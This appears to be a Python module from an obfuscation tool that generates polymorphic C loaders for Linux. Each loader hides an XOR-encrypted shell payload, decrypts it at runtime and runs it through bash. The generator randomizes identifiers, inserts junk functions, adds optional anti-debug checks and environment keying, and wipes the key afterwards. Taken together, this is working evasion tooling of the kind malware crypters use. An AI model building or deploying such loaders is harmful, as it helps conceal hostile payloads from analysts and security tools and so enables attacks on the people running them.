"""Polymorphic C loader source generation."""

from __future__ import annotations

import random
from dataclasses import dataclass

from obfush.compiler.anti_debug import generate_anti_debug
from obfush.compiler.crypto import EncryptedPayload
from obfush.compiler.env_keying import c_environment_check


@dataclass(frozen=True)
class StubResult:
    source: str
    anti_debug_checks: list[str]
    key_size: int


def generate_stub(
    encrypted: EncryptedPayload,
    rng: random.Random,
    *,
    anti_debug: bool = True,
    environment_tag: bytes | None = None,
) -> StubResult:
    """Generate a Linux C loader with randomized identifiers and function order."""
    names = [_c_name(rng) for _ in range(24)]
    decrypt_name, run_name, wipe_name, env_name = names[:4]
    anti_fragments = generate_anti_debug(rng, names[4:9]) if anti_debug else []
    junk = [_junk_function(names[9 + index], rng) for index in range(rng.randint(2, 4))]
    env_source = (
        c_environment_check(environment_tag, env_name)
        if environment_tag is not None else ""
    )
    helper_sources = [fragment.source for fragment in anti_fragments] + junk
    if env_source:
        helper_sources.append(env_source)
    rng.shuffle(helper_sources)
    anti_call = " || ".join(f"{fragment.source.split('(', 1)[0].split()[-1]}()" for fragment in anti_fragments)
    anti_guard = f"if ({anti_call}) return 126;" if anti_call else ""
    env_guard = f"if (!{env_name}()) return 125;" if environment_tag is not None else ""

    payload_bytes = _c_bytes(encrypted.ciphertext)
    key_bytes = _c_bytes(encrypted.key)
    source = f"""#define _GNU_SOURCE
#include <stdint.h>
#include <errno.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static unsigned char {names[20]}[] = {{{payload_bytes}}};
static unsigned char {names[21]}[] = {{{key_bytes}}};
static const size_t {names[22]} = sizeof({names[20]});
static volatile unsigned long {names[23]} = 0;

{_sha256_source()}

{chr(10).join(helper_sources)}

static void {wipe_name}(volatile unsigned char *p, size_t n) {{
    while (n--) *p++ = 0;
}}

static unsigned char *{decrypt_name}(void) {{
    unsigned char *out = malloc({names[22]} + 1);
    if (!out) return NULL;
    for (size_t i = 0; i < {names[22]}; ++i) out[i] = {names[20]}[i] ^ {names[21]}[i % sizeof({names[21]})];
    out[{names[22]}] = '\\0';
    return out;
}}

static int {run_name}(unsigned char *payload, int argc, char **argv) {{
    pid_t pid = fork();
    if (pid < 0) return 127;
    if (pid == 0) {{
        char **bash_argv = calloc((size_t)argc + 4, sizeof(char *));
        if (!bash_argv) _exit(127);
        bash_argv[0] = (char *)"bash";
        bash_argv[1] = (char *)"-c";
        bash_argv[2] = (char *)payload;
        bash_argv[3] = argv[0];
        for (int i = 1; i < argc; ++i) bash_argv[i + 3] = argv[i];
        bash_argv[argc + 3] = NULL;
        execv("/bin/bash", bash_argv);
        _exit(127);
    }}
    int status = 0;
    while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {{}}
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
    return 127;
}}

int main(int argc, char **argv) {{
    {anti_guard}
    {env_guard}
    unsigned char *payload = {decrypt_name}();
    if (!payload) return 127;
    int rc = {run_name}(payload, argc, argv);
    {wipe_name}(payload, {names[22]});
    free(payload);
    {wipe_name}({names[21]}, sizeof({names[21]}));
    {names[23]} ^= (unsigned long)rc;
    return rc;
}}
"""
    return StubResult(
        source=source,
        anti_debug_checks=[fragment.name for fragment in anti_fragments],
        key_size=len(encrypted.key),
    )


def _c_name(rng: random.Random) -> str:
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    return "_" + "".join(rng.choice(alphabet) for _ in range(rng.randint(5, 10)))


def _c_bytes(data: bytes) -> str:
    return ", ".join(f"0x{byte:02x}" for byte in data)


def _junk_function(name: str, rng: random.Random) -> str:
    first, second = rng.randint(1000, 65535), rng.randint(1000, 65535)
    return f"""static unsigned long {name}(unsigned long x) {{
    x ^= {first}UL;
    x = (x << 7) | (x >> (sizeof(x) * 8 - 7));
    return x + {second}UL;
}}"""


def _sha256_source() -> str:
    """Return a compact, self-contained SHA-256 implementation."""
    return r"""
typedef struct {
    uint32_t h[8];
    uint64_t bits;
    unsigned char block[64];
    size_t used;
} obfush_sha256_ctx;

static uint32_t obfush_rotr(uint32_t x, unsigned n) {
    return (x >> n) | (x << (32U - n));
}

static void obfush_sha256_block(obfush_sha256_ctx *ctx, const unsigned char block[64]) {
    static const uint32_t k[64] = {
        0x428a2f98U,0x71374491U,0xb5c0fbcfU,0xe9b5dba5U,0x3956c25bU,0x59f111f1U,0x923f82a4U,0xab1c5ed5U,
        0xd807aa98U,0x12835b01U,0x243185beU,0x550c7dc3U,0x72be5d74U,0x80deb1feU,0x9bdc06a7U,0xc19bf174U,
        0xe49b69c1U,0xefbe4786U,0x0fc19dc6U,0x240ca1ccU,0x2de92c6fU,0x4a7484aaU,0x5cb0a9dcU,0x76f988daU,
        0x983e5152U,0xa831c66dU,0xb00327c8U,0xbf597fc7U,0xc6e00bf3U,0xd5a79147U,0x06ca6351U,0x14292967U,
        0x27b70a85U,0x2e1b2138U,0x4d2c6dfcU,0x53380d13U,0x650a7354U,0x766a0abbU,0x81c2c92eU,0x92722c85U,
        0xa2bfe8a1U,0xa81a664bU,0xc24b8b70U,0xc76c51a3U,0xd192e819U,0xd6990624U,0xf40e3585U,0x106aa070U,
        0x19a4c116U,0x1e376c08U,0x2748774cU,0x34b0bcb5U,0x391c0cb3U,0x4ed8aa4aU,0x5b9cca4fU,0x682e6ff3U,
        0x748f82eeU,0x78a5636fU,0x84c87814U,0x8cc70208U,0x90befffaU,0xa4506cebU,0xbef9a3f7U,0xc67178f2U
    };
    uint32_t w[64], a, b, c, d, e, f, g, h;
    for (size_t i = 0; i < 16; ++i) {
        w[i] = ((uint32_t)block[i*4] << 24) | ((uint32_t)block[i*4+1] << 16) |
               ((uint32_t)block[i*4+2] << 8) | (uint32_t)block[i*4+3];
    }
    for (size_t i = 16; i < 64; ++i) {
        uint32_t s0 = obfush_rotr(w[i-15],7) ^ obfush_rotr(w[i-15],18) ^ (w[i-15] >> 3);
        uint32_t s1 = obfush_rotr(w[i-2],17) ^ obfush_rotr(w[i-2],19) ^ (w[i-2] >> 10);
        w[i] = w[i-16] + s0 + w[i-7] + s1;
    }
    a=ctx->h[0]; b=ctx->h[1]; c=ctx->h[2]; d=ctx->h[3];
    e=ctx->h[4]; f=ctx->h[5]; g=ctx->h[6]; h=ctx->h[7];
    for (size_t i = 0; i < 64; ++i) {
        uint32_t s1=obfush_rotr(e,6)^obfush_rotr(e,11)^obfush_rotr(e,25);
        uint32_t ch=(e&f)^((~e)&g);
        uint32_t t1=h+s1+ch+k[i]+w[i];
        uint32_t s0=obfush_rotr(a,2)^obfush_rotr(a,13)^obfush_rotr(a,22);
        uint32_t maj=(a&b)^(a&c)^(b&c);
        uint32_t t2=s0+maj;
        h=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
    }
    ctx->h[0]+=a; ctx->h[1]+=b; ctx->h[2]+=c; ctx->h[3]+=d;
    ctx->h[4]+=e; ctx->h[5]+=f; ctx->h[6]+=g; ctx->h[7]+=h;
}

static void obfush_sha256(const unsigned char *data, size_t len, unsigned char out[32]) {
    obfush_sha256_ctx ctx = {{
        {0x6a09e667U,0xbb67ae85U,0x3c6ef372U,0xa54ff53aU,0x510e527fU,0x9b05688cU,0x1f83d9abU,0x5be0cd19U},
        0, {0}, 0
    }};
    ctx.bits = (uint64_t)len * 8U;
    while (len > 0) {
        size_t take = 64U - ctx.used;
        if (take > len) take = len;
        memcpy(ctx.block + ctx.used, data, take);
        ctx.used += take; data += take; len -= take;
        if (ctx.used == 64U) { obfush_sha256_block(&ctx, ctx.block); ctx.used = 0; }
    }
    ctx.block[ctx.used++] = 0x80;
    if (ctx.used > 56U) {
        memset(ctx.block + ctx.used, 0, 64U - ctx.used);
        obfush_sha256_block(&ctx, ctx.block);
        ctx.used = 0;
    }
    memset(ctx.block + ctx.used, 0, 56U - ctx.used);
    for (size_t i = 0; i < 8; ++i) ctx.block[63U-i] = (unsigned char)(ctx.bits >> (i*8U));
    obfush_sha256_block(&ctx, ctx.block);
    for (size_t i = 0; i < 8; ++i) {
        out[i*4]=(unsigned char)(ctx.h[i]>>24); out[i*4+1]=(unsigned char)(ctx.h[i]>>16);
        out[i*4+2]=(unsigned char)(ctx.h[i]>>8); out[i*4+3]=(unsigned char)ctx.h[i];
    }
}
"""
